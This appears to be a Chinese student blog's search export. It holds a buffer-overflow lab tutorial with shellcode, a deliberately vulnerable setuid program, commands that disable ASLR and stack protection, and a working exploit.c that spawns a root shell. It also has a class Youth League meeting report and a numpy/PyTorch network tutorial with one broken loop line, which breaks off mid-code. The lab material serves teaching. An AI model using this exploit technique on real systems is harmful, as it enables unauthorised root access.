<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>黑客从入门到入狱---不得不说的缓冲区溢出攻击</title>
      <link href="/2020/11/11/buffer/"/>
      <url>/2020/11/11/buffer/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="qing-tong-xue-men-xue-dao-ji-zhu-hou-bu-yao-dao-chu-shen-zhang">请同学们学到技术后不要到处伸张</span></h1><h2><span id="jian-dan-jie-shao-shi-me-shi-huan-chong-qu-yi-chu-gong-ji">简单介绍：什么是缓冲区溢出攻击</span></h2><p>缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来<strong>改变程序的流控制</strong>，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，<strong>溢出会引起返回地址被重写。</strong><br>| 之前要接触的技能 |<br>|–|<br>| 有c语言基础 |<br>| 会进制转换以及计算 |<br>| vim基本使用 |<br>| 熟悉基本linux命令 |<br>实验在蓝桥实验楼上可以进行，用的是<strong>linux系统</strong></p><h2><span id="tong-xue-men-yi-jing-ji-ke-nan-nai-liao-wo-men-ma-shang-kai-shi">同学们已经饥渴难耐了，我们马上开始</span></h2><h3><span id="san-jun-wei-dong-liang-cao-xian-xing">三军未动，粮草先行</span></h3><p>随着黑客技术的发展，黑客的防护措施也越来越发达了，那么为了我们的实验能够成功，我们做一个准备工作</p><h4><span id="shu-ru-ming-ling-an-zhuang-yi-xie-yong-yu-bian-yi-32-wei-c-cheng-xu-de-ruan-jian-bao">输入命令安装一些用于编译32位c程序的软件包：</span></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y lib32z1 libc6-dev-i386 lib32readline6-dev<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y python3.6-gdbm gdb</code></pre><h2><span id="cai-niao-chu-xue-ding-dian-she-ji-gan-shou-hei-ke-de-kuai-gan">菜鸟初学，定点射击，感受黑客的快感！</span></h2><h3><span id="guan-bi-di-zhi-kong-jian-sui-ji-hua-nei-cun-di-zhi-bu-yong-cai-shou-dao-qin-lai">关闭地址空间随机化，内存地址不用猜，收到擒来！</span></h3><p>我们要找到地址的返回地址，<strong>用shellcode的地址覆盖着个返回地址来完成入侵</strong>，那么这个空间如果是随机化的就会增加我们的入侵难度，既然是入门，我先不让地址移动，定点射击。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span>0</code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111164526301.png#pic_center" alt="如图"></p><h3><span id="fang-zhi-bin-bash-de-fang-hu-cuo-shi-wo-men-yi-hua-jie-mu-man-tian-guo-hai">防止/bin/bash的防护措施，我们移花接木，瞒天过海</span></h3><p>zsh代替bash 妙啊！</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token function">cd</span> /bin<span class="token function">rm</span> sh<span class="token function">ln</span> -s zsh sh<span class="token keyword">exit</span></code></pre><h3><span id="fu-chong-jin-ru-linux32-xi-tong-chong-chong-chong">俯冲进入linux32系统，冲冲冲！</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111164819133.png#pic_center" alt="俯冲到位"></p><h2><span id="shellcode-fen-xi">shellcode分析</span></h2><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>    name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其实就是用execve来调用/bin/sh里面的程序，这里面的程序可以获得root的权限，所以如果别人不小心调用了我们的这个shellcode，我们就可以获得对面主机的root权限。</p><p><strong>shellcode对应的汇编版本</strong></p><pre class=" language-c"><code class="language-c">\x31\xc0\x50\x68<span class="token string">"//sh"</span>\x68<span class="token string">"/bin"</span>\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</code></pre><h2><span id="lou-dong-cheng-xu-fen-xi">漏洞程序分析</span></h2><p>在/tmp目录下新建一个stack.c文件:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /tmpvim stack.c</code></pre><h3><span id="tong-guo-dai-ma-ke-yi-zhi-dao-cheng-xu-hui-du-qu-yi-ge-ming-wei-badfile-de-wen-jian-bing-jiang-wen-jian-nei-rong-zhuang-ru-buffer">通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/* stack.c */</span><span class="token comment" spellcheck="true">/* This program has a buffer overflow vulnerability. */</span><span class="token comment" spellcheck="true">/* Our task is to exploit this vulnerability */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* The following statement has a buffer overflow problem */</span>     <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3><span id="si-sui-gcc-bian-yi-qi-de-zui-hou-yi-dao-xin-li-fang-xian">撕碎gcc编译器的最后一道心理防线</span></h3><p>不仅让人想起欧文所写的<strong>人性的弱点</strong>，人的心理防线恐怕就是最后一道防线了！</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span>gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c<span class="token function">chmod</span> u+s stack<span class="token keyword">exit</span></code></pre><p>GCC编译器有一种栈保护机制来阻止缓冲区溢出，所以我们在编译代码时需要用–fno-stack-protector关闭这种机制。 而 <strong>-z execstack</strong> 用于允许执行栈。</p><p>-g 参数是为了使编译后得到的可执行文档能用 <strong>gdb 调试</strong>。</p><h2><span id="gong-ji-cheng-xu-fen-xi-gong-ji-gang-cai-de-lou-dong-cheng-xu">攻击程序分析（攻击刚才的漏洞程序）</span></h2><p>我们的目的是攻击刚才的漏洞程序，并通过攻击获得 root 权限。</p><p>在 /tmp 目录下新建一个 exploit.c 文件，输入如下内容：</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/* exploit.c */</span><span class="token comment" spellcheck="true">/* A program that creates a file containing code for launching shell*/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>    <span class="token string">"\x31\xc0"</span> <span class="token comment" spellcheck="true">//xorl %eax,%eax</span>    <span class="token string">"\x50"</span>     <span class="token comment" spellcheck="true">//pushl %eax</span>    <span class="token string">"\x68"</span><span class="token string">"//sh"</span> <span class="token operator">/</span><span class="token operator">/</span>pushl $<span class="token number">0x68732f2f</span>    <span class="token string">"\x68"</span><span class="token string">"/bin"</span>     <span class="token comment" spellcheck="true">//pushl $0x6e69622f</span>    <span class="token string">"\x89\xe3"</span> <span class="token comment" spellcheck="true">//movl %esp,%ebx</span>    <span class="token string">"\x50"</span>     <span class="token comment" spellcheck="true">//pushl %eax</span>    <span class="token string">"\x53"</span>     <span class="token comment" spellcheck="true">//pushl %ebx</span>    <span class="token string">"\x89\xe1"</span> <span class="token comment" spellcheck="true">//movl %esp,%ecx</span>    <span class="token string">"\x99"</span>     <span class="token comment" spellcheck="true">//cdq</span>    <span class="token string">"\xb0\x0b"</span> <span class="token comment" spellcheck="true">//movb $0x0b,%al</span>    <span class="token string">"\xcd\x80"</span> <span class="token comment" spellcheck="true">//int $0x80</span>    <span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Initialize buffer with 0x90 (NOP instruction) */</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* You need to fill the buffer with appropriate contents here */</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x??\x??\x??\x??"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//在buffer特定偏移处起始的四个字节覆盖sellcode地址  </span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//将shellcode拷贝至buffer，偏移量设为了 100</span>    <span class="token comment" spellcheck="true">/* Save the contents to the file "badfile" */</span>    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./badfile"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>注意上面的代码，\x??\x??\x??\x??处需要<strong>添上 shellcode 保存在内存中的地址</strong>，因为发生溢出后这个位置刚好可以覆盖返回地址。而 strcpy(buffer+100,shellcode); 这一句又告诉我们，shellcode 保存在 <strong>buffer + 100</strong> 的位置。下面我们将详细介绍如何获得我们需要添加的地址。<br><strong>现在我们要得到 shellcode 在内存中的地址，输入命令进入 gdb 调试：</strong></p><pre class=" language-bash"><code class="language-bash">gdb stackdisass main</code></pre><p>结果如图：<br>![寻找shellcode的地址第一步]](<a href="https://img-blog.csdnimg.cn/20201111170917823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/20201111170917823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center</a>)<br>esp 中就是 str 的起始地址，所以我们在地址 0x080484ee 处设置断点。<br>接下来的操作：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 设置断点</span>b *0x080484eeri r <span class="token variable">$esp</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111171715553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="gdb找到str首地址"><br>最后获得的这个<strong>0xffffcfb0</strong>就是str的地址<br><strong>按 q 键，再按 y 键可退出调试。</strong><br>根据语句 strcpy(buffer + 100,shellcode); 我们计算 shellcode 的地址为 0xffffcfb0 + 0x64 = 0xffffd014</p><p>实际操作中你的地址和我这里的地址可能不一样，需要根据你实际输出的结果来计算。<br><a href="http://www.99cankao.com/digital-computation/hex-addition-calculator.php" target="_blank" rel="noopener">十六进制加法计算器</a><br>现在修改 exploit.c 文件，将 \x??\x??\x??\x?? 修改为计算的结果 ==\x14\xd0\xff\xff==，注意顺序是反的。<br>然后，编译exploit.c程序：</p><pre class=" language-bash"><code class="language-bash">gcc -m32 -o exploit exploit.c</code></pre><h2><span id="shun-jian-ru-qin">瞬间入侵</span></h2><p>![success]](<a href="https://img-blog.csdnimg.cn/20201111172411758.png#pic_center" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/20201111172411758.png#pic_center</a>)</p><hr><h1><span id="yi-xie-si-kao-ti-wo-men-sheng-hua-yi-xia">一些思考题，我们升华一下？！</span></h1><h2><span id="wei-shi-me-shi-tian-chong-24-ge-zi-jie-de-0x90">为什么是填充24个字节的0x90？？？</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111182041328.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="示意图"></p><p>关闭地址随机后，正常的是本地变量buffer内存，之后四个字节是ebp，然后就是返回的地址了！<br>那么为什么我们这里不是<strong>12+4=16而是24</strong>呢？</p><p>在漏洞程序中我们调用bof函数来完成缓冲区的溢出，我们用<strong>gdb</strong>来查看bof分配的内存是多少!!!<br>结果显示函数分配了0x14的地址也就是20，所以是20+4=24！！！</p><h2><span id="wo-men-yao-de-dao-shellcode-zai-nei-cun-de-di-zhi-wei-shi-me-shi-cha-kan-stack-de-nei-cun">我们要得到shellcode在内存的地址，为什么是查看stack的内存</span></h2><p>我们可以通过查看stack的首地址来得到str的首地址，而shellcode存在了str+100的位置，所以得到的这个地址+0x64（100）就是shellcode的地址拉！<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111224553798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="bof函数开了0x14（20）的内存"></p><h2><span id="jiang-x-x-x-x-xiu-gai-wei-x14-xd2-xff-xff-wei-shi-me-shi-fan-guo-lai-tian-xie">将 \x??\x??\x??\x?? 修改为 \x14\xd2\xff\xff (为什么是反过来填写？)</span></h2><p>因为地址从后面往前读的，读出来就是0xffffd214</p><h1><span id="te-bie-gan-xie-cheng-lao-dong-zong-long-wang-de-ji-zhu-zhi-chi-he-dai-ma-zhi-dao">特别感谢程佬，董总，龙王的技术支持和代码指导！</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201111183207430.jpg#pic_center" alt="我又茁壮成长了！"></p>]]></content>
      
      
      <categories>
          
          <category> 黑客从入门到入狱 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 缓冲区溢出攻击 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖南大学通信系一班 “学习习近平总书记来校考察调研时的重要讲话精神”团课活动与团代表选举大会</title>
      <link href="/2020/10/18/HUN-20TX-1/"/>
      <url>/2020/10/18/HUN-20TX-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="hu-nan-da-xue-tong-xin-xi-yi-ban-tuan-ke-xue-xi-xuan-chuan">湖南大学通信系一班 团课学习宣传</span></h1><h1><span id="xue-xi-xi-jin-ping-zong-shu-ji-lai-xiao-kao-cha-diao-yan-shi-de-chong-yao-jiang-hua-jing-shen-tuan-ke-huo-dong-yu-tuan-dai-biao-xuan-ju-da-hui">“学习习近平总书记来校考察调研时的重要讲话精神”团课活动与团代表选举大会</span></h1><p>&emsp;&emsp;2020年10月17日下午2：30湖南大学信息科学与工程学院通信系一班在院楼314举行了“学习习近平总书记来校考察调研时的重要讲话精神”的团课活动并选举了团代表。本次团课活动和选举大会由通信系一班的团支书陈佳丽同学和班长王秀婷同学主持。<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201018201957872.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>&emsp;&emsp;团课上，我们观看了习近平总书记来到湖南大学岳麓书院讲话的视频，短短的5分钟视频，却牵动了在场学子们的心。“为楚有才，于斯为盛，真的是人才济济啊！”在视频结束后，同学们纷纷踊跃地上台发表自己的心得，有秩序，有思想，有激情，感慨激昂的心得环绕着院楼的314教室，真的是“余音绕梁，三日不绝”啊！314教室充满着正能量！由于时间紧迫，支书陈佳丽同学接用习近平总书记的话结束了本次的团课“祝你们成功！”团课就此圆满结束。</p><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020101817464053.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020101820203456.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><p>&emsp;&emsp;紧接着，我们举行了团代表选举大会，组织委员严袁司祎进行了简单的开场白：“距离上次大家一起开会已经有些日子了，让我想起李白的一首诗，‘云想衣裳花想容，春风拂站露华浓。若非群玉山头见，会向瑶台月下逢。’我们再次相逢在学院院楼314，我甚是想念大家，这次我们需要有七名同学出来自荐自己成为团代表，然后选出五名团代表。先预祝这次团代表选举大会圆满结束，下面请同学们上台自荐”<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201018174536796.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="4"></p><p>&emsp;&emsp;自荐的环节异常地激烈，大家都积极地上台介绍自己，表达着自己想组织靠拢的决心。无论是“想和大家一起建设社会主义，还是“实事求是，敢为人先的决心”，大家用言语表达着对组织无法言语的爱和积极性。我们通过投票，最后产生了五名团代表，他们分别是孙晨阳，李益格，梁小茜，许琪波，姜泽鑫。<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201018174700135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="5"></p><p>&emsp;&emsp;这次的团课加深了大家身为湖大学子的自豪感，并引发了大家激烈的心得交流，是十分有意义的，团代表选举大会也让我们看到了班上优秀的同学们！通信系一班是一个很棒的班级，通信系一班团支部一定会成为一个优秀的集体。</p><p>&emsp;&emsp;在掌声中，通信系一班有秩序地离场。天是有些小雨，风儿旋不起黄色的落叶。大家又开始为让世界看到湖大学子的风采而努力，他们奔赴科研前线开始了紧张的学习。“祝你们成功!”再次回荡在我的心中。</p><p>撰稿：yysy</p>]]></content>
      
      
      <categories>
          
          <category> 学生工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 团支部大会 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教学，实现两层神经网络(在b站有辅助视频，视频非原创)</title>
      <link href="/2020/10/07/two-layer-nn/"/>
      <url>/2020/10/07/two-layer-nn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ru-he-shi-xian-liang-ceng-shen-jing-wang-luo">如何实现两层神经网络</span></h1><h1><span id="san-jun-wei-dong-liang-cao-xian-xing-shi-yong-de-ruan-jian-he-gong-ju">三军未动，粮草先行(使用的软件和工具)</span></h1><p>我们在jupyter notebook上来运行我们的代码<br>使用的是pytorch<br><strong>为什么使用jupter notebook呢？</strong><br>Don‘t repeat yourself<br>1.它可以保留运行的结果，不用重复运行<br>2.可以在code和markdown之间切换，方便记录学习，markdown的注释更加好看，更能更多<br><strong>为什么使用pytorch呢？</strong><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020092910343783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><strong>用的真爽，让我神采奕奕，容光焕发，双目炯炯有神！</strong></p><hr><h2><span id="re-shen-yong-numpy-shi-xian-liang-ceng-shen-jing-wang-luo">热身：用numpy实现两层神经网络</span></h2><p>一个全连接ReLU神经网络，一个隐藏层，没有bias。用来从x预测y，使用L2 Loss</p><ul><li>$h=w_1x+b_1$</li><li>$a=max(0,h)$</li><li>$y_{hat}=w_2a$<br>这一实现完全使用numpy来计算前向神经网络，loss，和反向传播。</li><li>forward pass</li><li>loss</li><li>backward pass<br>numpy ndarray是一个普通的n维array。它不知道任何关于深度学习或者梯度(gradient)的知识，也不知道计算图（computation graph），知识一种用来计算数学运算的数据结构<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npN<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token comment" spellcheck="true"># 随机创建一些训练数据</span>x<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_in<span class="token punctuation">)</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span>w1<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">)</span>w2<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span>learning_rate<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">6</span> <span class="token comment" spellcheck="true"># 过拟合，欠拟合</span>r it <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># Forward pass</span>  h<span class="token operator">=</span>x<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>w1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># N*H</span>  h_relu<span class="token operator">=</span>np<span class="token punctuation">.</span>maximum<span class="token punctuation">(</span>h<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># N*H</span>  y_pred<span class="token operator">=</span>h_relu<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>w2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># N*D_out</span>  <span class="token comment" spellcheck="true"># compute loss</span>  loss <span class="token operator">=</span>np<span class="token punctuation">.</span>square<span class="token punctuation">(</span>y_pred<span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#和均方差的区别只是一个乘积</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>loss<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 其实是存在一个mean函数的，这里先不管</span>  <span class="token comment" spellcheck="true"># Backward pass</span>  <span class="token comment" spellcheck="true"># compute the gradient</span>  grad_y_pred<span class="token operator">=</span><span class="token number">2.0</span><span class="token operator">*</span><span class="token punctuation">(</span>y_pred<span class="token operator">-</span>y<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#loss 求导</span>  grad_w2<span class="token operator">=</span>h_relu<span class="token punctuation">.</span>T<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>grad_y_pred<span class="token punctuation">)</span>  grad_h_relu<span class="token operator">=</span>grad_y_pred<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>w2<span class="token punctuation">.</span>T<span class="token punctuation">)</span>  grad_h<span class="token operator">=</span>grad_h_relu<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>  grad_h<span class="token punctuation">[</span>h<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>  grad_w1<span class="token operator">=</span>x<span class="token punctuation">.</span>T<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>grad_h<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># update weight of w1 and w2</span>  w1 <span class="token operator">-=</span>learning_rate<span class="token operator">*</span>grad_w1  w2 <span class="token operator">-=</span>learning_rate<span class="token operator">*</span>grad_w2</code></pre></li></ul><hr><h3><span id="you-guan-fan-xiang-chuan-bo-de-ju-zhen-cheng-fa-tui-dao">有关反向传播的矩阵乘法推导</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020092910415996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><hr><h2><span id="pytorch-tensors-lai-chuang-jian-wang-luo-ji-suan-sun-shi-yi-ji-fan-xiang-chuan-bo">PyTorch:Tensors来创建网络，计算损失以及反向传播</span></h2><p>一个PyTorch Tensor很想一个numpy的ndarray。但是它和numpy ndarray最大的区别是，PyTorch Tensor可以在CPU或者GPU上运算，如果想要在GPU上运算，就需要把Tensor换成cuda类型</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torchN<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span 